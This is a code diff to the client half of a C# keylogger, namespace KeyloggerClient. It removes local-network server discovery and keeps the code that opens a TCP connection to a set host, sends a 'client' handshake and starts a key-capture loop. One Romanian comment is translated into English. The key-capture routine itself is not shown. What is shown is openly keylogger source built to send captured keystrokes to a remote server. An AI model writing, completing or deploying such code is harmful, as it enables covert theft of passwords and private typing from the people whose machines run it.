@@ -43,22 +43,10 @@ namespace KeyloggerClient
         {
             try
             {
-                if (host == "127.0.0.1") // default means discover automatically
-                {
-                    string discoveredIp = await ServerDiscovery.DiscoverServerAsync();
-                    if (discoveredIp == null)
-                        throw new KeyloggerException("Server discovery failed. No server found on local network.");
-
-                    host = discoveredIp;
-                }
-
                 client = new TcpClient(host, port);
-
                 stream = client.GetStream();
 
-                /// <summary>
-                /// Sends a handshake message to identify this as a client.
-                /// </summary>
+                // Sends a handshake message to identify this as a client.
                 byte[] handshake = Encoding.UTF8.GetBytes("client");
                 await stream.WriteAsync(handshake, 0, handshake.Length);
 
@@ -69,7 +57,7 @@ namespace KeyloggerClient
                 var captureTask = Task.Run(() => CaptureKeysLoop(cts.Token), cancellationToken);
 
                 _running = true;
-                // Așteptăm fie cancelare, fie până când clientul este oprit
+                // Wait for either cancellation or manual stop
                 while (_running && !cancellationToken.IsCancellationRequested)
                 {
                     await Task.Delay(1000, cancellationToken);
